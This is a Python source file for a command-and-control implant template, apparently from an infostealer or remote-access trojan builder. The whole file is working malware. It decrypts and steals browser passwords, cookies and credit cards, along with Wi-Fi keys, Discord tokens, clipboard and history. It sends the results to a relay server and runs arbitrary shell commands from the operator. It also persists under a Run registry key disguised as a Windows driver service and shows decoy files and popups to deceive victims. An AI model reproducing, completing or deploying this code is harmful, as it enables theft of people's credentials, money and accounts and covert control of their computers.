# C2_Client/payload/template.py
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, random, shutil, re
from datetime import datetime
import xml.etree.ElementTree as ET
import io
import zipfile

# --- Library Availability Flags ---
LIBS_AVAILABLE = False
try:
    import winreg, psutil, mss
    from PIL import Image
    LIBS_AVAILABLE = True
except ImportError: pass

CRYPTO_LIBS_AVAILABLE = False
try:
    import win32crypt
    from Crypto.Cipher import AES
    CRYPTO_LIBS_AVAILABLE = True
except ImportError: pass

CLIPBOARD_AVAILABLE = False
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError: pass

# --- CONFIGURATION INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
GUARDIAN_NAMES = {{GUARDIAN_NAMES}}
GUARDIAN_DATA_B64 = {{GUARDIAN_DATA_B64}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
RESULTS_QUEUE = []
RESULTS_LOCK = threading.Lock()

# ==================================================================================================
# --- CORE HELPER FUNCTIONS ---
# ==================================================================================================
def _run_shell_command(command_str):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(command_str, shell=True, capture_output=True, text=True, timeout=60, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip() if result.stdout else (result.stderr.strip() or "N/A")
    except Exception:
        return "N/A"

def _find_browser_paths(target_filename):
    paths = []
    appdata = os.getenv("APPDATA")
    local_appdata = os.getenv("LOCALAPPDATA")
    base_paths = {
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable")
    }
    for browser, path in base_paths.items():
        if os.path.exists(path):
            profiles = [d for d in os.listdir(path) if d.startswith(('Default', 'Profile '))]
            if not profiles and os.path.exists(os.path.join(path, target_filename)):
                paths.append({'browser': browser, 'profile': 'Default', 'path': os.path.join(path, target_filename)})
            for profile in profiles:
                db_path = os.path.join(path, profile, target_filename)
                if os.path.exists(db_path):
                    paths.append({'browser': browser, 'profile': profile, 'path': db_path})
    return paths

def _get_encryption_key(browser_user_data_path):
    if not CRYPTO_LIBS_AVAILABLE: return None
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(key_b64)[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def _decrypt_value(data, key):
    if not CRYPTO_LIBS_AVAILABLE or not key or not data: return ""
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_bytes = cipher.decrypt(payload)
        return decrypted_bytes[:-16].decode('utf-8')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return ""

# ==================================================================================================
# --- ACTION HANDLERS (for C2 commands) & HARVESTING FUNCTIONS ---
# ==================================================================================================
def _action_shell(params):
    return {"status": "success", "data": _run_shell_command(params.get("command", ""))}

def _action_screenshot(params):
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library mss/Pillow not available."}
    try:
        with mss() as sct:
            sct_img = sct.grab(sct.monitors[0])
            img_bytes = io.BytesIO()
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            img.save(img_bytes, format='PNG')
        return {"status": "success", "data": base64.b64encode(img_bytes.getvalue()).decode()}
    except Exception as e:
        return {"status": "error", "data": str(e)}

def _get_system_info():
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        return {"status": "success", "data": {
            "System": platform.system(), "Release": platform.release(), "Version": platform.version(),
            "Machine": platform.machine(), "Processor": platform.processor(),
            "Hostname": socket.gethostname(), "Uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
        }}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_hardware_info():
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        cpu_info = f"{psutil.cpu_count(logical=True)} Cores @ {psutil.cpu_freq().max if psutil.cpu_freq() else 'N/A'}MHz"
        ram_info = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        disks = "\n".join([f"{p.device:<10} ({p.fstype})\t {psutil.disk_usage(p.mountpoint).total / (1024**3):.2f} GB" for p in psutil.disk_partitions()])
        gpu_info = _run_shell_command('wmic path win32_videocontroller get caption').replace("Caption", "").strip()
        return {"status": "success", "data": {"CPU": cpu_info, "RAM": ram_info, "GPU": gpu_info, "Disks": disks}}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_security_products():
    try:
        av = _run_shell_command('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName').replace("displayName", "").strip()
        fw = _run_shell_command('wmic /namespace:\\\\root\\SecurityCenter2 path FirewallProduct get displayName').replace("displayName", "").strip()
        return {"status": "success", "data": f"Antivirus:\n{av or 'Not Found'}\n\nFirewall:\n{fw or 'Not Found'}"}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_installed_applications():
    return {"status": "success", "data": _run_shell_command('wmic product get name,version')}

def _get_running_processes():
    if not LIBS_AVAILABLE: return {"status": "error", "data": "Library psutil not available."}
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try: procs.append({"pid": p.info['pid'], "name": p.info['name'], "username": p.info.get('username', 'N/A')})
            except (psutil.NoSuchProcess, psutil.AccessDenied): continue
        return {"status": "success", "data": procs}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_environment_variables():
    return {"status": "success", "data": "\n".join([f"{key:<30}: {value}" for key, value in os.environ.items()])}

def _get_network_info():
    try:
        private_ip = socket.gethostbyname(socket.gethostname())
        public_ip = "N/A"
        try: public_ip = requests.get('https://api.ipify.org', timeout=3).text
        except: public_ip = requests.get('https://icanhazip.com', timeout=3).text
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return {"status": "success", "data": {"Private IP": private_ip, "Public IP": public_ip, "MAC Address": mac_address}}
    except Exception: return {"status": "error", "data": "Failed to retrieve full network info."}

def _get_wifi_passwords():
    all_profiles = []
    try:
        profiles_output = _run_shell_command('netsh wlan show profiles')
        profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)
        for name in profile_names:
            name = name.strip()
            password_output = _run_shell_command(f'netsh wlan show profile name="{name}" key=clear')
            password_match = re.search(r"Key Content\s*:\s(.*)", password_output)
            password = password_match.group(1).strip() if password_match else 'N/A (Open Network)'
            all_profiles.append({"SSID": name, "Password": password})
        return {"status": "success", "data": all_profiles if all_profiles else "No WiFi profiles found."}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_active_connections(): return {"status": "success", "data": _run_shell_command('netstat -an')}
def _get_arp_table(): return {"status": "success", "data": _run_shell_command('arp -a')}
def _get_dns_cache(): return {"status": "success", "data": _run_shell_command('ipconfig /displaydns')}

def _get_browser_passwords():
    if not CRYPTO_LIBS_AVAILABLE: return {"status": "error", "data": "Crypto libraries not available."}
    all_passwords = []
    for browser_info in _find_browser_paths("Login Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key = _get_encryption_key(os.path.dirname(os.path.dirname(db_path)))
        if not key: continue
        
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for row in conn.cursor().execute("SELECT origin_url, username_value, password_value FROM logins"):
                if all(row) and (password := _decrypt_value(row[2], key)):
                    all_passwords.append({"Browser": browser, "URL": row[0], "Username": row[1], "Password": password})
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return {"status": "success", "data": all_passwords or "No passwords found."}

def _get_session_cookies():
    if not CRYPTO_LIBS_AVAILABLE: return {"status": "error", "data": "Crypto libraries not available."}
    all_cookies = []
    for browser_info in _find_browser_paths(os.path.join("Network", "Cookies")):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key = _get_encryption_key(os.path.dirname(os.path.dirname(os.path.dirname(db_path))))
        if not key: continue
        
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for row in conn.cursor().execute("SELECT host_key, name, expires_utc, encrypted_value FROM cookies"):
                 if all(row) and (value := _decrypt_value(row[3], key)):
                    all_cookies.append({"Host": row[0], "Name": row[1], "Expires (UTC)": row[2], "Value": value})
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return {"status": "success", "data": all_cookies or "No cookies found."}

def _get_discord_tokens():
    potential_tokens = []
    regex = r"mfa\.[\w-]{84}|[MN][A-Za-z\d_-]{23,26}\.[\w-]{6}\.[\w-]{27,}"
    search_paths = [os.path.join(os.environ["APPDATA"], p, "Local Storage", "leveldb") for p in ["discord", "discordcanary", "lightcord"]]
    search_paths.extend([info['path'] for info in _find_browser_paths(os.path.join("Local Storage", "leveldb"))])
    
    for path in search_paths:
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        for line in f:
                            for token in re.findall(regex, line.strip()):
                                if token not in potential_tokens: potential_tokens.append(token)
                except (IOError, OSError): continue
    
    valid_tokens = []
    for token in potential_tokens:
        try:
            res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
            if res.status_code == 200: valid_tokens.append(token)
        except requests.RequestException: continue
    
    return {"status": "success", "data": valid_tokens or "No valid tokens found."}

def _get_telegram_session():
    found = os.path.exists(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata"))
    return {"status": "success", "data": "Found" if found else "Not found"}

def _get_crypto_wallets():
    found_wallets = []
    wallets = { "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"), "Atomic": os.path.join(os.environ["APPDATA"], "atomic")}
    for name, path in wallets.items():
        if os.path.exists(path): found_wallets.append(name)
    return {"status": "success", "data": ", ".join(found_wallets) or "No known wallet folders found."}

def _get_browser_credit_cards():
    if not CRYPTO_LIBS_AVAILABLE: return {"status": "error", "data": "Crypto libraries not available."}
    all_cards = []
    for browser_info in _find_browser_paths("Web Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key = _get_encryption_key(os.path.dirname(os.path.dirname(db_path)))
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for row in conn.cursor().execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"):
                if row[3] and (cc_number := _decrypt_value(row[3], key)):
                    all_cards.append({"Name on Card": row[0], "Expires (MM/YY)": f"{row[1]}/{row[2]}", "Card Number": cc_number})
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return {"status": "success", "data": all_cards or "No credit cards found."}
    
def _get_browser_history():
    all_history = []
    for browser_info in _find_browser_paths("History"):
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(browser_info['path'], temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for row in conn.cursor().execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200"):
                epoch = int(str(row[3])[:10])
                all_history.append({"URL": row[0], "Title": row[1], "Visit Count": row[2], "Last Visit (UTC)": datetime.fromtimestamp(epoch).strftime('%Y-%m-%d %H:%M:%S')})
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return {"status": "success", "data": all_history or "No browser history found."}

def _get_clipboard_contents():
    if not CLIPBOARD_AVAILABLE: return {"status": "error", "data": "Library pyperclip not available."}
    try: return {"status": "success", "data": pyperclip.paste()}
    except Exception as e: return {"status": "error", "data": str(e)}

def _get_browser_files():
    if not CRYPTO_LIBS_AVAILABLE: return {"status": "error", "data": "Crypto libraries not available."}
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        file_map = { "Login Data": "Login_Data", "Local State": "Local_State", os.path.join("Network", "Cookies"): "Cookies", "Web Data": "Web_Data" }
        unique_paths = {info['path']: info for info in _find_browser_paths("")}.values()
        for browser_info in unique_paths:
            browser_path = os.path.dirname(browser_info['path'])
            browser_name = browser_info['browser']
            for file_key, zip_name_prefix in file_map.items():
                source_path = os.path.join(browser_path, file_key)
                if os.path.exists(source_path):
                    arcname = f"{browser_name}_{zip_name_prefix}"
                    zf.write(source_path, arcname)
    return {"status": "success", "data": base64.b64encode(zip_buffer.getvalue()).decode()}

def _initial_harvest():
    harvesting_modules = {
        "System Info": _get_system_info, "Hardware Info": _get_hardware_info,
        "Security Products": _get_security_products, "Installed Applications": _get_installed_applications,
        "Running Processes": _get_running_processes, "Environment Variables": _get_environment_variables,
        "Network Info": _get_network_info, "Wi-Fi Passwords": _get_wifi_passwords,
        "Active Connections": _get_active_connections, "ARP Table": _get_arp_table,
        "DNS Cache": _get_dns_cache, "Browser Passwords": _get_browser_passwords,
        "Session Cookies": _get_session_cookies, "Discord Tokens": _get_discord_tokens,
        "Telegram Session Files": _get_telegram_session, "Cryptocurrency Wallet Files": _get_crypto_wallets,
        "Credit Card Data": _get_browser_credit_cards, "Browser History": _get_browser_history,
        "Clipboard Contents": _get_clipboard_contents, "Browser Files": _get_browser_files,
    }
    for name, func in harvesting_modules.items():
        try:
            output = func()
            result_payload = {"command": name, "output": output}
            with RESULTS_LOCK:
                RESULTS_QUEUE.append(result_payload)
        except Exception:
            error_payload = {"command": name, "output": {"status": "error", "data": "Module failed to execute."}}
            with RESULTS_LOCK:
                RESULTS_QUEUE.append(error_payload)
        time.sleep(0.1)

def command_and_control_loop():
    _initial_harvest()
    metadata_sent = False
    while True:
        try:
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER}
            if not metadata_sent:
                initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{platform.system()} {platform.release()}"}
                heartbeat_data.update(initial_metadata)
            
            with RESULTS_LOCK:
                if RESULTS_QUEUE:
                    heartbeat_data["results"] = RESULTS_QUEUE[:]
                    RESULTS_QUEUE.clear()
            
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40)
            
            if response.status_code == 200:
                if not metadata_sent:
                    metadata_sent = True
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        
        except requests.RequestException:
            time.sleep(random.randint(60, 120))
            continue
        except Exception:
            pass
        time.sleep(random.randint(15, 30))

def setup_resilience():
    if not hasattr(sys, 'frozen') or not LIBS_AVAILABLE: return
    try:
        is_main_payload = not any(g_name in sys.executable for g_name in GUARDIAN_NAMES)
        persist_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'DRVSTR')
        if not os.path.exists(persist_dir): os.makedirs(persist_dir)
        current_exe_path = sys.executable
        main_payload_name = os.path.basename(current_exe_path) if is_main_payload else [g for g in GUARDIAN_NAMES if g in current_exe_path][0]
        persist_path = os.path.join(persist_dir, main_payload_name)
        if PERSISTENCE_ENABLED and current_exe_path.lower() != persist_path.lower():
            shutil.copy2(current_exe_path, persist_path)
            key = winreg.HKEY_CURRENT_USER; key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as run_key:
                reg_name = "Windows Driver Service" if is_main_payload else f"Host Service {random.randint(1000,9999)}"
                winreg.SetValueEx(run_key, reg_name, 0, winreg.REG_SZ, f'"{persist_path}"')
            subprocess.Popen([persist_path]); sys.exit(0)
        if HYDRA_ENABLED:
            my_pid = os.getpid()
            if is_main_payload:
                for guardian_info in GUARDIAN_DATA_B64:
                    guardian_filename = guardian_info["filename"]
                    guardian_path = os.path.join(persist_dir, guardian_filename)
                    if not os.path.exists(guardian_path):
                        with open(guardian_path, "wb") as f: f.write(base64.b64decode(guardian_info["data_b64"]))
                    subprocess.Popen([guardian_path, '--watchdog', str(my_pid), persist_path])
                    subprocess.Popen([persist_path, '--watchdog', str(subprocess.Popen([guardian_path]).pid), guardian_path])
    except Exception: pass

def run_decoy():
    if not DECOY_ENABLED or not DECOY_FILENAME: return
    try:
        temp_dir = os.environ.get("TEMP", "C:\\Users\\Public"); decoy_path = os.path.join(temp_dir, DECOY_FILENAME)
        with open(decoy_path, 'wb') as f: f.write(base64.b64decode(DECOY_DATA_B64))
        os.startfile(decoy_path)
    except: pass

def show_startup_popup():
    if not POPUP_ENABLED: return
    try: import ctypes; ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, POPUP_TITLE, 0x40)
    except: pass

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == '--watchdog':
        pid_to_watch = int(sys.argv[2])
        executable_to_run = sys.argv[3]
        while True: time.sleep(10)
    else:
        is_main_payload = not any(g_name in sys.executable for g_name in GUARDIAN_NAMES)
        if is_main_payload:
            show_startup_popup()
            run_decoy()
        setup_resilience()
        command_and_control_loop()